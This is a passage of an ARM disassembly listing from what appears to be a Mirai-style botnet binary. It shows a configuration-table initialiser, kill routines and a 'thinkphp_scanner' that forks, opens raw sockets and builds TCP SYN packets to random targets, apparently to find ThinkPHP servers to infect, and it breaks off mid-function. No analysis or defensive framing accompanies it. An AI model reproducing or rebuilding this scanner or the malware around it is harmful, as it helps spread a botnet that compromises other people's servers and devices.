   13a4c:	e59f144c 	ldr	r1, [pc, #1100]	; 13ea0 <table_init+0x8e0>
   13a50:	e1a05000 	mov	r5, r0
   13a54:	eb00044f 	bl	14b98 <util_memcpy>
   13a58:	e1a00006 	mov	r0, r6
   13a5c:	e58450b0 	str	r5, [r4, #176]	; 0xb0
   13a60:	e1c46bb4 	strh	r6, [r4, #180]	; 0xb4
   13a64:	eb000e0e 	bl	172a4 <malloc>
   13a68:	e1a02006 	mov	r2, r6
   13a6c:	e59f1430 	ldr	r1, [pc, #1072]	; 13ea4 <table_init+0x8e4>
   13a70:	e1a05000 	mov	r5, r0
   13a74:	eb000447 	bl	14b98 <util_memcpy>
   13a78:	e1a00008 	mov	r0, r8
   13a7c:	e58450b8 	str	r5, [r4, #184]	; 0xb8
   13a80:	e1c46bbc 	strh	r6, [r4, #188]	; 0xbc
   13a84:	eb000e06 	bl	172a4 <malloc>
   13a88:	e59f1418 	ldr	r1, [pc, #1048]	; 13ea8 <table_init+0x8e8>
   13a8c:	e1a02008 	mov	r2, r8
   13a90:	e1a05000 	mov	r5, r0
   13a94:	eb00043f 	bl	14b98 <util_memcpy>
   13a98:	e3a00003 	mov	r0, #3
   13a9c:	e58450c0 	str	r5, [r4, #192]	; 0xc0
   13aa0:	e1c48cb4 	strh	r8, [r4, #196]	; 0xc4
   13aa4:	eb000dfe 	bl	172a4 <malloc>
   13aa8:	e59f13fc 	ldr	r1, [pc, #1020]	; 13eac <table_init+0x8ec>
   13aac:	e3a02003 	mov	r2, #3
   13ab0:	e1a05000 	mov	r5, r0
   13ab4:	eb000437 	bl	14b98 <util_memcpy>
   13ab8:	e3a03003 	mov	r3, #3
   13abc:	e1a00007 	mov	r0, r7
   13ac0:	e1c43cbc 	strh	r3, [r4, #204]	; 0xcc
   13ac4:	e58450c8 	str	r5, [r4, #200]	; 0xc8
   13ac8:	eb000df5 	bl	172a4 <malloc>
   13acc:	e59f13dc 	ldr	r1, [pc, #988]	; 13eb0 <table_init+0x8f0>
   13ad0:	e1a02007 	mov	r2, r7
   13ad4:	e1a05000 	mov	r5, r0
   13ad8:	eb00042e 	bl	14b98 <util_memcpy>
   13adc:	e3a00011 	mov	r0, #17
   13ae0:	e5845068 	str	r5, [r4, #104]	; 0x68
   13ae4:	e1c476bc 	strh	r7, [r4, #108]	; 0x6c
   13ae8:	eb000ded 	bl	172a4 <malloc>
   13aec:	e59f13c0 	ldr	r1, [pc, #960]	; 13eb4 <table_init+0x8f4>
   13af0:	e3a02011 	mov	r2, #17
   13af4:	e1a05000 	mov	r5, r0
   13af8:	eb000426 	bl	14b98 <util_memcpy>
   13afc:	e3a02011 	mov	r2, #17
   13b00:	e3a0000b 	mov	r0, #11
   13b04:	e5845070 	str	r5, [r4, #112]	; 0x70
   13b08:	e1c427b4 	strh	r2, [r4, #116]	; 0x74
   13b0c:	eb000de4 	bl	172a4 <malloc>
   13b10:	e59f13a0 	ldr	r1, [pc, #928]	; 13eb8 <table_init+0x8f8>
   13b14:	e3a0200b 	mov	r2, #11
   13b18:	e1a05000 	mov	r5, r0
   13b1c:	eb00041d 	bl	14b98 <util_memcpy>
   13b20:	e3a0300b 	mov	r3, #11
   13b24:	e3a0005f 	mov	r0, #95	; 0x5f
   13b28:	e1c437bc 	strh	r3, [r4, #124]	; 0x7c
   13b2c:	e5845078 	str	r5, [r4, #120]	; 0x78
   13b30:	eb000ddb 	bl	172a4 <malloc>
   13b34:	e59f1380 	ldr	r1, [pc, #896]	; 13ebc <table_init+0x8fc>
   13b38:	e3a0205f 	mov	r2, #95	; 0x5f
   13b3c:	e1a05000 	mov	r5, r0
   13b40:	eb000414 	bl	14b98 <util_memcpy>
   13b44:	e3a03f91 	mov	r3, #580	; 0x244
   13b48:	e3a0205f 	mov	r2, #95	; 0x5f
   13b4c:	e3a0005b 	mov	r0, #91	; 0x5b
   13b50:	e18420b3 	strh	r2, [r4, r3]
   13b54:	e5845240 	str	r5, [r4, #576]	; 0x240
   13b58:	eb000dd1 	bl	172a4 <malloc>
   13b5c:	e59f135c 	ldr	r1, [pc, #860]	; 13ec0 <table_init+0x900>
   13b60:	e3a0205b 	mov	r2, #91	; 0x5b
   13b64:	e1a05000 	mov	r5, r0
   13b68:	eb00040a 	bl	14b98 <util_memcpy>
   13b6c:	e3a03f93 	mov	r3, #588	; 0x24c
   13b70:	e3a0205b 	mov	r2, #91	; 0x5b
   13b74:	e3a0005a 	mov	r0, #90	; 0x5a
   13b78:	e18420b3 	strh	r2, [r4, r3]
   13b7c:	e5845248 	str	r5, [r4, #584]	; 0x248
   13b80:	eb000dc7 	bl	172a4 <malloc>
   13b84:	e59f1338 	ldr	r1, [pc, #824]	; 13ec4 <table_init+0x904>
   13b88:	e3a0205a 	mov	r2, #90	; 0x5a
   13b8c:	e1a05000 	mov	r5, r0
   13b90:	eb000400 	bl	14b98 <util_memcpy>
   13b94:	e3a03f95 	mov	r3, #596	; 0x254
   13b98:	e3a0205a 	mov	r2, #90	; 0x5a
   13b9c:	e3a0003f 	mov	r0, #63	; 0x3f
   13ba0:	e18420b3 	strh	r2, [r4, r3]
   13ba4:	e5845250 	str	r5, [r4, #592]	; 0x250
   13ba8:	eb000dbd 	bl	172a4 <malloc>
   13bac:	e59f1314 	ldr	r1, [pc, #788]	; 13ec8 <table_init+0x908>
   13bb0:	e3a0203f 	mov	r2, #63	; 0x3f
   13bb4:	e1a05000 	mov	r5, r0
   13bb8:	eb0003f6 	bl	14b98 <util_memcpy>
   13bbc:	e3a03f97 	mov	r3, #604	; 0x25c
   13bc0:	e3a0203f 	mov	r2, #63	; 0x3f
   13bc4:	e3a00089 	mov	r0, #137	; 0x89
   13bc8:	e18420b3 	strh	r2, [r4, r3]
   13bcc:	e5845258 	str	r5, [r4, #600]	; 0x258
   13bd0:	eb000db3 	bl	172a4 <malloc>
   13bd4:	e59f12f0 	ldr	r1, [pc, #752]	; 13ecc <table_init+0x90c>
   13bd8:	e3a02089 	mov	r2, #137	; 0x89
   13bdc:	e1a05000 	mov	r5, r0
   13be0:	eb0003ec 	bl	14b98 <util_memcpy>
   13be4:	e3a03f99 	mov	r3, #612	; 0x264
   13be8:	e3a02089 	mov	r2, #137	; 0x89
   13bec:	e3a00009 	mov	r0, #9
   13bf0:	e18420b3 	strh	r2, [r4, r3]
   13bf4:	e5845260 	str	r5, [r4, #608]	; 0x260
   13bf8:	eb000da9 	bl	172a4 <malloc>
   13bfc:	e59f12cc 	ldr	r1, [pc, #716]	; 13ed0 <table_init+0x910>
   13c00:	e3a02009 	mov	r2, #9
   13c04:	e1a05000 	mov	r5, r0
   13c08:	eb0003e2 	bl	14b98 <util_memcpy>
   13c0c:	e3a03f9b 	mov	r3, #620	; 0x26c
   13c10:	e3a02009 	mov	r2, #9
   13c14:	e1a0000b 	mov	r0, fp
   13c18:	e18420b3 	strh	r2, [r4, r3]
   13c1c:	e5845268 	str	r5, [r4, #616]	; 0x268
   13c20:	eb000d9f 	bl	172a4 <malloc>
   13c24:	e59f12a8 	ldr	r1, [pc, #680]	; 13ed4 <table_init+0x914>
   13c28:	e1a0200b 	mov	r2, fp
   13c2c:	e1a05000 	mov	r5, r0
   13c30:	eb0003d8 	bl	14b98 <util_memcpy>
   13c34:	e3a03f9d 	mov	r3, #628	; 0x274
   13c38:	e1a00008 	mov	r0, r8
   13c3c:	e184b0b3 	strh	fp, [r4, r3]
   13c40:	e5845270 	str	r5, [r4, #624]	; 0x270
   13c44:	eb000d96 	bl	172a4 <malloc>
   13c48:	e59f1288 	ldr	r1, [pc, #648]	; 13ed8 <table_init+0x918>
   13c4c:	e1a02008 	mov	r2, r8
   13c50:	e1a05000 	mov	r5, r0
   13c54:	eb0003cf 	bl	14b98 <util_memcpy>
   13c58:	e3a03f9f 	mov	r3, #636	; 0x27c
   13c5c:	e1a00009 	mov	r0, r9
   13c60:	e18480b3 	strh	r8, [r4, r3]
   13c64:	e5845278 	str	r5, [r4, #632]	; 0x278
   13c68:	eb000d8d 	bl	172a4 <malloc>
   13c6c:	e59f1268 	ldr	r1, [pc, #616]	; 13edc <table_init+0x91c>
   13c70:	e1a02009 	mov	r2, r9
   13c74:	e1a05000 	mov	r5, r0
   13c78:	eb0003c6 	bl	14b98 <util_memcpy>
   13c7c:	e3a03fa1 	mov	r3, #644	; 0x284
   13c80:	e1a0000a 	mov	r0, sl
   13c84:	e18490b3 	strh	r9, [r4, r3]
   13c88:	e5845280 	str	r5, [r4, #640]	; 0x280
   13c8c:	eb000d84 	bl	172a4 <malloc>
   13c90:	e59f1248 	ldr	r1, [pc, #584]	; 13ee0 <table_init+0x920>
   13c94:	e1a0200a 	mov	r2, sl
   13c98:	e1a05000 	mov	r5, r0
   13c9c:	eb0003bd 	bl	14b98 <util_memcpy>
   13ca0:	e3a03fa3 	mov	r3, #652	; 0x28c
   13ca4:	e1a0000a 	mov	r0, sl
   13ca8:	e184a0b3 	strh	sl, [r4, r3]
   13cac:	e5845288 	str	r5, [r4, #648]	; 0x288
   13cb0:	eb000d7b 	bl	172a4 <malloc>
   13cb4:	e59f1228 	ldr	r1, [pc, #552]	; 13ee4 <table_init+0x924>
   13cb8:	e1a0200a 	mov	r2, sl
   13cbc:	e1a05000 	mov	r5, r0
   13cc0:	eb0003b4 	bl	14b98 <util_memcpy>
   13cc4:	e3a03fa5 	mov	r3, #660	; 0x294
   13cc8:	e1a0000a 	mov	r0, sl
   13ccc:	e184a0b3 	strh	sl, [r4, r3]
   13cd0:	e5845290 	str	r5, [r4, #656]	; 0x290
   13cd4:	eb000d72 	bl	172a4 <malloc>
   13cd8:	e59f1208 	ldr	r1, [pc, #520]	; 13ee8 <table_init+0x928>
   13cdc:	e1a0200a 	mov	r2, sl
   13ce0:	e1a05000 	mov	r5, r0
   13ce4:	eb0003ab 	bl	14b98 <util_memcpy>
   13ce8:	e3a03fa7 	mov	r3, #668	; 0x29c
   13cec:	e3a0000e 	mov	r0, #14
   13cf0:	e184a0b3 	strh	sl, [r4, r3]
   13cf4:	e5845298 	str	r5, [r4, #664]	; 0x298
   13cf8:	eb000d69 	bl	172a4 <malloc>
   13cfc:	e59f11e8 	ldr	r1, [pc, #488]	; 13eec <table_init+0x92c>
   13d00:	e3a0200e 	mov	r2, #14
   13d04:	e1a05000 	mov	r5, r0
   13d08:	eb0003a2 	bl	14b98 <util_memcpy>
   13d0c:	e3a0300e 	mov	r3, #14
   13d10:	e3a00013 	mov	r0, #19
   13d14:	e1c43dbc 	strh	r3, [r4, #220]	; 0xdc
   13d18:	e58450d8 	str	r5, [r4, #216]	; 0xd8
   13d1c:	eb000d60 	bl	172a4 <malloc>
   13d20:	e59f11c8 	ldr	r1, [pc, #456]	; 13ef0 <table_init+0x930>
   13d24:	e3a02013 	mov	r2, #19
   13d28:	e1a05000 	mov	r5, r0
   13d2c:	eb000399 	bl	14b98 <util_memcpy>
   13d30:	e3a02013 	mov	r2, #19
   13d34:	e3a00017 	mov	r0, #23
   13d38:	e58450e0 	str	r5, [r4, #224]	; 0xe0
   13d3c:	e1c42eb4 	strh	r2, [r4, #228]	; 0xe4
   13d40:	eb000d57 	bl	172a4 <malloc>
   13d44:	e59f11a8 	ldr	r1, [pc, #424]	; 13ef4 <table_init+0x934>
   13d48:	e3a02017 	mov	r2, #23
   13d4c:	e1a05000 	mov	r5, r0
   13d50:	eb000390 	bl	14b98 <util_memcpy>
   13d54:	e3a03017 	mov	r3, #23
   13d58:	e3a00018 	mov	r0, #24
   13d5c:	e1c43ebc 	strh	r3, [r4, #236]	; 0xec
   13d60:	e58450e8 	str	r5, [r4, #232]	; 0xe8
   13d64:	eb000d4e 	bl	172a4 <malloc>
   13d68:	e59f1188 	ldr	r1, [pc, #392]	; 13ef8 <table_init+0x938>
   13d6c:	e3a02018 	mov	r2, #24
   13d70:	e1a05000 	mov	r5, r0
   13d74:	eb000387 	bl	14b98 <util_memcpy>
   13d78:	e3a02018 	mov	r2, #24
   13d7c:	e3a0000f 	mov	r0, #15
   13d80:	e58450f0 	str	r5, [r4, #240]	; 0xf0
   13d84:	e1c42fb4 	strh	r2, [r4, #244]	; 0xf4
   13d88:	eb000d45 	bl	172a4 <malloc>
   13d8c:	e59f1168 	ldr	r1, [pc, #360]	; 13efc <table_init+0x93c>
   13d90:	e3a0200f 	mov	r2, #15
   13d94:	e3a0500f 	mov	r5, #15
   13d98:	e1a06000 	mov	r6, r0
   13d9c:	eb00037d 	bl	14b98 <util_memcpy>
   13da0:	e3a00016 	mov	r0, #22
   13da4:	e58460f8 	str	r6, [r4, #248]	; 0xf8
   13da8:	e1c45fbc 	strh	r5, [r4, #252]	; 0xfc
   13dac:	eb000d3c 	bl	172a4 <malloc>
   13db0:	e59f1148 	ldr	r1, [pc, #328]	; 13f00 <table_init+0x940>
   13db4:	e3a02016 	mov	r2, #22
   13db8:	e1a06000 	mov	r6, r0
   13dbc:	eb000375 	bl	14b98 <util_memcpy>
   13dc0:	e3a03f41 	mov	r3, #260	; 0x104
   13dc4:	e3a02016 	mov	r2, #22
   13dc8:	e1a00005 	mov	r0, r5
   13dcc:	e18420b3 	strh	r2, [r4, r3]
   13dd0:	e5846100 	str	r6, [r4, #256]	; 0x100
   13dd4:	eb000d32 	bl	172a4 <malloc>
   13dd8:	e1a02005 	mov	r2, r5
   13ddc:	e59f1120 	ldr	r1, [pc, #288]	; 13f04 <table_init+0x944>
   13de0:	e1a06000 	mov	r6, r0
   13de4:	eb00036b 	bl	14b98 <util_memcpy>
   13de8:	e3a03f43 	mov	r3, #268	; 0x10c
   13dec:	e3a00020 	mov	r0, #32
   13df0:	e18450b3 	strh	r5, [r4, r3]
   13df4:	e5846108 	str	r6, [r4, #264]	; 0x108
   13df8:	eb000d29 	bl	172a4 <malloc>
   13dfc:	e59f1104 	ldr	r1, [pc, #260]	; 13f08 <table_init+0x948>
   13e00:	e3a02020 	mov	r2, #32
   13e04:	e1a05000 	mov	r5, r0
   13e08:	eb000362 	bl	14b98 <util_memcpy>
   13e0c:	e3a03020 	mov	r3, #32
   13e10:	e1c43db4 	strh	r3, [r4, #212]	; 0xd4
   13e14:	e58450d0 	str	r5, [r4, #208]	; 0xd0
   13e18:	e28dd004 	add	sp, sp, #4
   13e1c:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   13e20:	e12fff1e 	bx	lr
   13e24:	0002b8cc 	.word	0x0002b8cc
   13e28:	0001fc74 	.word	0x0001fc74
   13e2c:	0001fc84 	.word	0x0001fc84
   13e30:	0001fc9c 	.word	0x0001fc9c
   13e34:	0001fcb4 	.word	0x0001fcb4
   13e38:	0001fd08 	.word	0x0001fd08
   13e3c:	0001fd2c 	.word	0x0001fd2c
   13e40:	0001fd60 	.word	0x0001fd60
   13e44:	0001fd70 	.word	0x0001fd70
   13e48:	0001fd7c 	.word	0x0001fd7c
   13e4c:	0001fd88 	.word	0x0001fd88
   13e50:	0001fd98 	.word	0x0001fd98
   13e54:	0001fdac 	.word	0x0001fdac
   13e58:	0001fdc0 	.word	0x0001fdc0
   13e5c:	0001fca8 	.word	0x0001fca8
   13e60:	0001fdcc 	.word	0x0001fdcc
   13e64:	0001fddc 	.word	0x0001fddc
   13e68:	0001fdf0 	.word	0x0001fdf0
   13e6c:	0001fe0c 	.word	0x0001fe0c
   13e70:	0001fe14 	.word	0x0001fe14
   13e74:	0001fe1c 	.word	0x0001fe1c
   13e78:	0001fe24 	.word	0x0001fe24
   13e7c:	0001fe34 	.word	0x0001fe34
   13e80:	0001fe3c 	.word	0x0001fe3c
   13e84:	0001fe50 	.word	0x0001fe50
   13e88:	0001fe5c 	.word	0x0001fe5c
   13e8c:	0001fe68 	.word	0x0001fe68
   13e90:	0001fe70 	.word	0x0001fe70
   13e94:	0001fe78 	.word	0x0001fe78
   13e98:	0001fe90 	.word	0x0001fe90
   13e9c:	0001feac 	.word	0x0001feac
   13ea0:	0001feb8 	.word	0x0001feb8
   13ea4:	0001fec0 	.word	0x0001fec0
   13ea8:	0001fec8 	.word	0x0001fec8
   13eac:	0001fed0 	.word	0x0001fed0
   13eb0:	0001fed4 	.word	0x0001fed4
   13eb4:	0001feec 	.word	0x0001feec
   13eb8:	0001ff00 	.word	0x0001ff00
   13ebc:	0001ff0c 	.word	0x0001ff0c
   13ec0:	0001ff6c 	.word	0x0001ff6c
   13ec4:	0001ffc8 	.word	0x0001ffc8
   13ec8:	00020024 	.word	0x00020024
   13ecc:	00020064 	.word	0x00020064
   13ed0:	000200f0 	.word	0x000200f0
   13ed4:	000200fc 	.word	0x000200fc
   13ed8:	0002010c 	.word	0x0002010c
   13edc:	00020114 	.word	0x00020114
   13ee0:	00020120 	.word	0x00020120
   13ee4:	00020128 	.word	0x00020128
   13ee8:	00020130 	.word	0x00020130
   13eec:	00020138 	.word	0x00020138
   13ef0:	00020148 	.word	0x00020148
   13ef4:	0002015c 	.word	0x0002015c
   13ef8:	00020174 	.word	0x00020174
   13efc:	00020190 	.word	0x00020190
   13f00:	000201a0 	.word	0x000201a0
   13f04:	000201b8 	.word	0x000201b8
   13f08:	000201c8 	.word	0x000201c8

00013f0c <scanner_kill>:
   13f0c:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   13f10:	e59f3018 	ldr	r3, [pc, #24]	; 13f30 <scanner_kill+0x24>
   13f14:	e24dd004 	sub	sp, sp, #4
   13f18:	e5930000 	ldr	r0, [r3]
   13f1c:	e3a01009 	mov	r1, #9
   13f20:	eb00089d 	bl	1619c <__GI_kill>
   13f24:	e28dd004 	add	sp, sp, #4
   13f28:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   13f2c:	e12fff1e 	bx	lr
   13f30:	0002bb70 	.word	0x0002bb70

00013f34 <thinkphp_kill>:
   13f34:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   13f38:	e59f3018 	ldr	r3, [pc, #24]	; 13f58 <thinkphp_kill+0x24>
   13f3c:	e24dd004 	sub	sp, sp, #4
   13f40:	e5930000 	ldr	r0, [r3]
   13f44:	e3a01009 	mov	r1, #9
   13f48:	eb000893 	bl	1619c <__GI_kill>
   13f4c:	e28dd004 	add	sp, sp, #4
   13f50:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   13f54:	e12fff1e 	bx	lr
   13f58:	00028d7c 	.word	0x00028d7c

00013f5c <thinkphp_setup_connection>:
   13f5c:	e92d4070 	push	{r4, r5, r6, lr}
   13f60:	e1a05000 	mov	r5, r0
   13f64:	e5900000 	ldr	r0, [r0]
   13f68:	e24dd010 	sub	sp, sp, #16
   13f6c:	e3a06000 	mov	r6, #0
   13f70:	e3700001 	cmn	r0, #1
   13f74:	e58d6000 	str	r6, [sp]
   13f78:	e58d6004 	str	r6, [sp, #4]
   13f7c:	e58d6008 	str	r6, [sp, #8]
   13f80:	e58d600c 	str	r6, [sp, #12]
   13f84:	1b0017ad 	blne	19e40 <__GI___libc_close>
   13f88:	e3a00002 	mov	r0, #2
   13f8c:	e3a01001 	mov	r1, #1
   13f90:	e1a02006 	mov	r2, r6
   13f94:	eb000c2e 	bl	17054 <__GI_socket>
   13f98:	e3700001 	cmn	r0, #1
   13f9c:	e5850000 	str	r0, [r5]
   13fa0:	0a00001e 	beq	14020 <thinkphp_setup_connection+0xc4>
   13fa4:	e2850018 	add	r0, r5, #24
   13fa8:	e3a01c01 	mov	r1, #256	; 0x100
   13fac:	e5856014 	str	r6, [r5, #20]
   13fb0:	eb000301 	bl	14bbc <util_zero>
   13fb4:	e5954000 	ldr	r4, [r5]
   13fb8:	e1a02006 	mov	r2, r6
   13fbc:	e3a01003 	mov	r1, #3
   13fc0:	e1a00004 	mov	r0, r4
   13fc4:	eb0007fa 	bl	15fb4 <__GI___libc_fcntl>
   13fc8:	e3a01004 	mov	r1, #4
   13fcc:	e3802b02 	orr	r2, r0, #2048	; 0x800
   13fd0:	e1a00004 	mov	r0, r4
   13fd4:	eb0007f6 	bl	15fb4 <__GI___libc_fcntl>
   13fd8:	e59f304c 	ldr	r3, [pc, #76]	; 1402c <thinkphp_setup_connection+0xd0>
   13fdc:	e5931000 	ldr	r1, [r3]
   13fe0:	e595300c 	ldr	r3, [r5, #12]
   13fe4:	e58d3004 	str	r3, [sp, #4]
   13fe8:	e3a03002 	mov	r3, #2
   13fec:	e5952008 	ldr	r2, [r5, #8]
   13ff0:	e1cd30b0 	strh	r3, [sp]
   13ff4:	e2422002 	sub	r2, r2, #2
   13ff8:	e1d531b0 	ldrh	r3, [r5, #16]
   13ffc:	e3520001 	cmp	r2, #1
   14000:	e1cd30b2 	strh	r3, [sp, #2]
   14004:	83a03001 	movhi	r3, #1
   14008:	e5851004 	str	r1, [r5, #4]
   1400c:	85853008 	strhi	r3, [r5, #8]
   14010:	e5950000 	ldr	r0, [r5]
   14014:	e1a0100d 	mov	r1, sp
   14018:	e3a02010 	mov	r2, #16
   1401c:	eb000ae7 	bl	16bc0 <__libc_connect>
   14020:	e28dd010 	add	sp, sp, #16
   14024:	e8bd4070 	pop	{r4, r5, r6, lr}
   14028:	e12fff1e 	bx	lr
   1402c:	00028dac 	.word	0x00028dac

00014030 <thinkphp_scanner>:
   14030:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   14034:	e24dde72 	sub	sp, sp, #1824	; 0x720
   14038:	e3a03000 	mov	r3, #0
   1403c:	e24dd00c 	sub	sp, sp, #12
   14040:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   14044:	eb0015c1 	bl	19750 <__libc_fork>
   14048:	e3700001 	cmn	r0, #1
   1404c:	13a03000 	movne	r3, #0
   14050:	03a03001 	moveq	r3, #1
   14054:	e3500000 	cmp	r0, #0
   14058:	d1a04003 	movle	r4, r3
   1405c:	c3834001 	orrgt	r4, r3, #1
   14060:	e59f3aa0 	ldr	r3, [pc, #2720]	; 14b08 <thinkphp_scanner+0xad8>
   14064:	e3540000 	cmp	r4, #0
   14068:	e5830000 	str	r0, [r3]
   1406c:	0a000003 	beq	14080 <thinkphp_scanner+0x50>
   14070:	e28ddfcb 	add	sp, sp, #812	; 0x32c
   14074:	e28ddb01 	add	sp, sp, #1024	; 0x400
   14078:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1407c:	e12fff1e 	bx	lr
   14080:	eb000357 	bl	14de4 <util_local_addr>
   14084:	e59f1a80 	ldr	r1, [pc, #2688]	; 14b0c <thinkphp_scanner+0xadc>
   14088:	e5810000 	str	r0, [r1]
   1408c:	ebfff970 	bl	12654 <rand_init>
   14090:	e1a00004 	mov	r0, r4
   14094:	eb0008d4 	bl	163ec <__GI_time>
   14098:	e59f2a70 	ldr	r2, [pc, #2672]	; 14b10 <thinkphp_scanner+0xae0>
   1409c:	e3a01e51 	mov	r1, #1296	; 0x510
   140a0:	e5820000 	str	r0, [r2]
   140a4:	e2811008 	add	r1, r1, #8
   140a8:	e3a00080 	mov	r0, #128	; 0x80
   140ac:	eb000eca 	bl	17bdc <calloc>
   140b0:	e59f3a5c 	ldr	r3, [pc, #2652]	; 14b14 <thinkphp_scanner+0xae4>
   140b4:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   140b8:	e5830000 	str	r0, [r3]
   140bc:	e1a0e004 	mov	lr, r4
   140c0:	e1a0228e 	lsl	r2, lr, #5
   140c4:	e1a0318e 	lsl	r3, lr, #3
   140c8:	e0833002 	add	r3, r3, r2
   140cc:	e59d0724 	ldr	r0, [sp, #1828]	; 0x724
   140d0:	e083300e 	add	r3, r3, lr
   140d4:	e1a03103 	lsl	r3, r3, #2
   140d8:	e1a01280 	lsl	r1, r0, #5
   140dc:	e06e3003 	rsb	r3, lr, r3
   140e0:	e1a02180 	lsl	r2, r0, #3
   140e4:	e59fea28 	ldr	lr, [pc, #2600]	; 14b14 <thinkphp_scanner+0xae4>
   140e8:	e0822001 	add	r2, r2, r1
   140ec:	e59ec000 	ldr	ip, [lr]
   140f0:	e0822000 	add	r2, r2, r0
   140f4:	e280e001 	add	lr, r0, #1
   140f8:	e1a03183 	lsl	r3, r3, #3
   140fc:	e1a02102 	lsl	r2, r2, #2
   14100:	e083300c 	add	r3, r3, ip
   14104:	e0602002 	rsb	r2, r0, r2
   14108:	e3a05000 	mov	r5, #0
   1410c:	e3e01000 	mvn	r1, #0
   14110:	e35e007f 	cmp	lr, #127	; 0x7f
   14114:	e78c1182 	str	r1, [ip, r2, lsl #3]
   14118:	e5835008 	str	r5, [r3, #8]
   1411c:	e58de724 	str	lr, [sp, #1828]	; 0x724
   14120:	daffffe6 	ble	140c0 <thinkphp_scanner+0x90>
   14124:	e2811004 	add	r1, r1, #4
   14128:	e3a00002 	mov	r0, #2
   1412c:	e3a02006 	mov	r2, #6
   14130:	eb000bc7 	bl	17054 <__GI_socket>
   14134:	e59f19dc 	ldr	r1, [pc, #2524]	; 14b18 <thinkphp_scanner+0xae8>
   14138:	e3700001 	cmn	r0, #1
   1413c:	e1a04000 	mov	r4, r0
   14140:	e5810000 	str	r0, [r1]
   14144:	0a00014e 	beq	14684 <thinkphp_scanner+0x654>
   14148:	e3a01003 	mov	r1, #3
   1414c:	e1a02005 	mov	r2, r5
   14150:	eb000797 	bl	15fb4 <__GI___libc_fcntl>
   14154:	e3a01004 	mov	r1, #4
   14158:	e3802b02 	orr	r2, r0, #2048	; 0x800
   1415c:	e1a00004 	mov	r0, r4
   14160:	eb000793 	bl	15fb4 <__GI___libc_fcntl>
   14164:	e28d3e72 	add	r3, sp, #1824	; 0x720
   14168:	e2833008 	add	r3, r3, #8
   1416c:	e3a02001 	mov	r2, #1
   14170:	e5232004 	str	r2, [r3, #-4]!
   14174:	e59f299c 	ldr	r2, [pc, #2460]	; 14b18 <thinkphp_scanner+0xae8>
   14178:	e3a0c004 	mov	ip, #4
   1417c:	e5920000 	ldr	r0, [r2]
   14180:	e1a01005 	mov	r1, r5
   14184:	e3a02003 	mov	r2, #3
   14188:	e58dc000 	str	ip, [sp]
   1418c:	eb000b9e 	bl	1700c <__GI_setsockopt>
   14190:	e3500000 	cmp	r0, #0
   14194:	1a000137 	bne	14678 <thinkphp_scanner+0x648>
   14198:	ebfff916 	bl	125f8 <rand_next>
   1419c:	e1a00800 	lsl	r0, r0, #16
   141a0:	e1a0c820 	lsr	ip, r0, #16
   141a4:	e20c30ff 	and	r3, ip, #255	; 0xff
   141a8:	e1a00c20 	lsr	r0, r0, #24
   141ac:	e1800403 	orr	r0, r0, r3, lsl #8
   141b0:	e3500b01 	cmp	r0, #1024	; 0x400
   141b4:	e58dc014 	str	ip, [sp, #20]
   141b8:	3afffff6 	bcc	14198 <thinkphp_scanner+0x168>
   141bc:	e59fe958 	ldr	lr, [pc, #2392]	; 14b1c <thinkphp_scanner+0xaec>
   141c0:	e5de3000 	ldrb	r3, [lr]
   141c4:	e3c3300a 	bic	r3, r3, #10
   141c8:	e3833005 	orr	r3, r3, #5
   141cc:	e5ce3000 	strb	r3, [lr]
   141d0:	e5de2000 	ldrb	r2, [lr]
   141d4:	e3c220b0 	bic	r2, r2, #176	; 0xb0
   141d8:	e3822040 	orr	r2, r2, #64	; 0x40
   141dc:	e3a01b0a 	mov	r1, #10240	; 0x2800
   141e0:	e5ce2000 	strb	r2, [lr]
   141e4:	e1ce10b2 	strh	r1, [lr, #2]
   141e8:	ebfff902 	bl	125f8 <rand_next>
   141ec:	e59f2928 	ldr	r2, [pc, #2344]	; 14b1c <thinkphp_scanner+0xaec>
   141f0:	e282b014 	add	fp, r2, #20
   141f4:	e5db100c 	ldrb	r1, [fp, #12]
   141f8:	e3a03040 	mov	r3, #64	; 0x40
   141fc:	e5c23008 	strb	r3, [r2, #8]
   14200:	e3c110a0 	bic	r1, r1, #160	; 0xa0
   14204:	e59f3910 	ldr	r3, [pc, #2320]	; 14b1c <thinkphp_scanner+0xaec>
   14208:	e1c200b4 	strh	r0, [r2, #4]
   1420c:	e3811050 	orr	r1, r1, #80	; 0x50
   14210:	e3a02006 	mov	r2, #6
   14214:	e5c32009 	strb	r2, [r3, #9]
   14218:	e5cb100c 	strb	r1, [fp, #12]
   1421c:	e59de014 	ldr	lr, [sp, #20]
   14220:	e3a0ca05 	mov	ip, #20480	; 0x5000
   14224:	e1c3e1b4 	strh	lr, [r3, #20]
   14228:	e1cbc0b2 	strh	ip, [fp, #2]
   1422c:	ebfff8f1 	bl	125f8 <rand_next>
   14230:	e5db300d 	ldrb	r3, [fp, #13]
   14234:	e28d1028 	add	r1, sp, #40	; 0x28
   14238:	e3833002 	orr	r3, r3, #2
   1423c:	e241100e 	sub	r1, r1, #14
   14240:	e5cb300d 	strb	r3, [fp, #13]
   14244:	e1cb00be 	strh	r0, [fp, #14]
   14248:	e58d100c 	str	r1, [sp, #12]
   1424c:	e59f28bc 	ldr	r2, [pc, #2236]	; 14b10 <thinkphp_scanner+0xae0>
   14250:	e5928000 	ldr	r8, [r2]
   14254:	e1590008 	cmp	r9, r8
   14258:	0a00009a 	beq	144c8 <thinkphp_scanner+0x498>
   1425c:	e3a03000 	mov	r3, #0
   14260:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   14264:	e3a03000 	mov	r3, #0
   14268:	e58d3710 	str	r3, [sp, #1808]	; 0x710
   1426c:	e58d3704 	str	r3, [sp, #1796]	; 0x704
   14270:	e58d3708 	str	r3, [sp, #1800]	; 0x708
   14274:	e58d370c 	str	r3, [sp, #1804]	; 0x70c
   14278:	ebfff8de 	bl	125f8 <rand_next>
   1427c:	e59fc888 	ldr	ip, [pc, #2184]	; 14b0c <thinkphp_scanner+0xadc>
   14280:	e59fe894 	ldr	lr, [pc, #2196]	; 14b1c <thinkphp_scanner+0xaec>
   14284:	e59c3000 	ldr	r3, [ip]
